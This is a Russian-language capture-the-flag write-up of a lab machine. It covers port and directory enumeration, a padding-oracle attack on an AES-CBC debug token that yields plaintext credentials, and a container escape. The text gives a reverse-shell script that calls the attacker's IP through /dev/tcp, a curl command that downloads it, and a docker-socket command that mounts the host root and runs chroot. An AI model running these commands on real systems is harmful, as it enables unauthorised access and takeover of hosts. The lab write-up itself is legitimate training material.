#web #crypto #aes #docker #docker-escape
nmap
```shell
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

dirsearch
```
Target: http://10.10.222.48:8080/

[16:57:26] Starting:
[16:57:53] 200 -    6KB - /favicon.ico
[16:57:59] 200 -    3KB - /login.html

Task Completed
```

gobuster
```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.222.48:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                wordlists/kali-wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4332]
/login.html           (Status: 200) [Size: 2670]
/exec.html            (Status: 401) [Size: 0]
/debug.html           (Status: 200) [Size: 2638]
/http%3A              (Status: 200) [Size: 4332]
/**http%3a            (Status: 200) [Size: 4332]
/*http%3A             (Status: 200) [Size: 4332]
/**http%3A            (Status: 200) [Size: 4332]
Progress: 882240 / 882244 (100.00%)
```

На странице debug в сурсах найден вот такой скрипт
```javascript
function stefanTest1002() {
        var xhr = new XMLHttpRequest();
        var url = "http://localhost/api/debug";
        // Submit the AES/CBC/PKCS payload to get an auth token
        // TODO: Finish logic to return token
        xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4", true);

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log("Response: ", xhr.responseText);
            } else {
                console.error("Failed to send request.");
            }
        };
        xhr.send();
```

Отсюда нас интересует интересный урл `/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4`

О нет, это криптовеб, куда я попал

39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 - это [[AES ]] c 5 блоками, где первый блок - вектор инициализации. Судя по тому, что сервис sponsored by oracle и по тому, что ему надо пофиксить "подробность ошибки, связанной с паддингом", перед нами паддинг оракул.

Всего 5 часов и я сделал. Воть stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599

Стандартные споосбы прокинуть ревшелл не сработали, но тут использовался обходной.
Делаем вот такой файлик

```bash
#!/bin/bash  
sh -i >& /dev/tcp/10.11.133.205/1337 0>&1
```

И качаем его на атакуемой машине

```bash
curl http://10.11.133.205:3228/rev.sh -o /tmp/rev
```

и тут начался сущий кошмар...

### Побег из контейнера

ладно, на самом деле все просто было. Был примонтирован сокет докера в контейнер. Смотришь, какие есть images, запускаешь один из них, монтируя корневую папку хоста в контейнер и делая в нее chroot. Все, у тебя доступ к файловой системе хоста.

делается это вот так
```shell
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
